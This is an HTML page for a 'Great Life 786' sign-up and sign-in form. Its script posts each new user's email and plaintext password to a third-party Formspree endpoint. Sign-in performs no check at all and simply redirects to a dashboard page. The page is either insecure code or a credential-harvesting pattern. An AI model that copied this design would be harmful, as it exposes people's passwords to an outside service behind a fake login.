<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Great Life 786 - Auth</title>
    <style>
        body { background-color: #0a0a0a; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { border: 1px solid #00ff66; padding: 20px; border-radius: 15px; width: 300px; text-align: center; background: #111; }
        h2 { color: #00ff66; }
        input, select { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #333; background: #1a1a1a; color: #fff; box-sizing: border-box; }
        .pass-wrapper { position: relative; }
        .toggle-pass { position: absolute; right: 10px; top: 35%; cursor: pointer; color: #888; font-size: 12px; }
        button { width: 100%; padding: 10px; background: #00ff66; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .switch { margin-top: 15px; font-size: 14px; cursor: pointer; color: #00ff66; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="container" id="auth-box">
    <!-- Sign Up Form -->
    <div id="signup-form">
        <h2>Sign Up</h2>
        <p>Great Life 786</p>
        <input type="email" id="up-email" placeholder="Email Address">
        <div class="pass-wrapper">
            <input type="password" id="up-pass" placeholder="Password">
            <span class="toggle-pass" onclick="togglePass('up-pass')">Show</span>
        </div>
        <div class="pass-wrapper">
            <input type="password" id="up-cpass" placeholder="Confirm Password">
        </div>
        <div style="display: flex; gap: 5px;">
            <select style="width: 80px;"><option>+92</option></select>
            <input type="tel" id="up-phone" placeholder="Mobile Number">
        </div>
        <button onclick="handleAuth('signup')">Sign Up</button>
        <p class="switch" onclick="switchForm()">Already have an account? Sign In</p>
    </div>

    <!-- Sign In Form -->
    <div id="signin-form" class="hidden">
        <h2>Sign In</h2>
        <p>Great Life 786</p>
        <input type="email" id="in-email" placeholder="Email Address">
        <div class="pass-wrapper">
            <input type="password" id="in-pass" placeholder="Password">
            <span class="toggle-pass" onclick="togglePass('in-pass')">Show</span>
        </div>
        <button onclick="handleAuth('signin')">Sign In</button>
        <p class="switch" onclick="switchForm()">Don't have an account? Sign Up</p>
    </div>
</div>

<script>
    function togglePass(id) {
        const input = document.getElementById(id);
        input.type = input.type === 'password' ? 'text' : 'password';
    }

    function switchForm() {
        document.getElementById('signup-form').classList.toggle('hidden');
        document.getElementById('signin-form').classList.toggle('hidden');
    }

    async function handleAuth(type) {
        if (type === 'signup') {
            alert("Account creation request sent successfully!");
            // Formspree connection
            const email = document.getElementById('up-email').value;
            const pass = document.getElementById('up-pass').value;
            await fetch('https://formspree.io/f/xkodnrde', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({email, pass})
            });
            switchForm();
        } else {
            alert("Signing in...");
            window.location.href = 'dashboard.html';
        }
    }
</script>

</body>
</html>
